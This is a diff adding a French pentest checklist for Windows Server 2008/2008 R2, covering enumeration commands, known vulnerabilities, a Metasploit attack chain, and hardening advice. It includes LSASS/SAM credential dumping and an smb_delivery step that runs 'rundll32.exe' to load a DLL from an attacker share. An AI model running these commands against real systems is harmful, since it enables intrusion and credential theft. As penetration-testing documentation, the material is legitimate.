@@ -2550,6 +2550,59 @@ Vulnérabilités exploitables **à distance** ou **localement sans interaction**
 
 ---
 
+# Windows Server — (2008 / 2008 R2)
+
+**But** : checklist rapide pour l'énumération, exploitation et recommandations quand on trouve un Server 2008 pendant un test interne.
+
+## Résumé rapide
+- Server 2008 / 2008 R2 = EOL (14-01-2020) → souvent non patché.  
+- Surface d'attaque : SMB, services anciens, drivers/kernel, tâches planifiées, logiciels tiers.  
+- Approche : identifier version → vérifier missing KBs → tester exploits connus → post-exploitation prudente.
+
+## Commandes d'énumération utiles
+- Identifier l'OS / build : `systeminfo` / `wmic os get Caption,CSDVersion,BuildNumber`
+- Hotfixes/patch level : `wmic qfe` ou `Get-Hotfix`
+- Services & processus : `tasklist /svc` / `sc query` / `net start`
+- Ports & profil réseau : `netstat -ano`
+- Tasks planifiées : `schtasks /query /fo LIST /v`
+- Permissions dossiers/scripts : `accesschk64.exe /accepteula -s -d C:\Scripts\`
+- Lister patchs via script : `Import-Module .\Sherlock.ps1 ; Find-AllVulns`
+- Comparer patchs offline : `Windows-Exploit-Suggester.py --systeminfo systeminfo.txt`
+
+## Vulnérabilités classiques
+- **MS10-092** (Task Scheduler XML) — PrivEsc local exploitable via tâches modifiables.  
+- **MS08-067** — RCE via Server service (vieilles XP/2003).  
+- **MS17-010 (EternalBlue)** — SMB RCE (7 / 2008 patch-level dépendant).  
+- **BlueKeep (CVE-2019-0708)** — RDP remote RCE sur certaines 7 / 2008 R2.  
+- Divers **Win32k / kernel** local EoP (MS13-053, MS16-135...) — rechercher via Sherlock.
+
+## Exemple d'enchaînement offensif
+1. Énumérer patchs : `wmic qfe` → repérer KB manquants.  
+2. Si SMB accessible et vulnérable → tenter `ms17_010` / EternalBlue (Metasploit ou PoC).  
+3. Si accès utilisateur local obtenu (meterpreter), récupérer session : `sessions -i <id>`  
+4. Migrer vers process x64 si nécessaire : `migrate <pid_x64>`  
+5. Lancer module local d'escalade (ex. Task Scheduler exploit) : dans msf `use exploit/windows/local/ms10_092_schelevator ; set SESSION <id> ; exploit`  
+6. Obtenir shell SYSTEM → dumper SAM/LSASS : `impacket-secretsdump` ou `meterpreter > hashdump`.
+
+Exemple delivery simple (smb_delivery) :  
+- lancer module msf `exploit/windows/smb/smb_delivery` → serveur SMB → exécuter sur cible : `rundll32.exe \\<attacker>\share\test.dll,0`  
+- catch shell sur `msf` handler.
+
+## Scheduled Tasks — vecteur fréquent
+- On peut **créer/modifier** une tâche si permissions faibles ou via module exploit.  
+- Énumérer tâches visibles : `schtasks /query /fo LIST /v`  
+- Rechercher dossiers scripts world-writable : `accesschk` sur `C:\Scripts` ou `C:\ProgramData\`  
+- Si un script exécuté en SYSTEM est modifiable → injecter payload (persistant ou one-shot).
+
+## Contre-mesures & recommandations
+- **Isoler/segmenter** systèmes EOL (VLAN, ACLs).  
+- Bloquer SMBv1, restreindre accès RDP, appliquer patchs critiques.  
+- Durcir tâches planifiées / scripts : restreindre ACLs sur dossiers contenant scripts.  
+- Deployer EDR/monitoring (PowerShell logging, Sysmon, SIEM) sur legacy hosts.  
+- Plan de migration / compensation (compensating controls) si mise à jour impossible.
+
+---
+
 
 
 
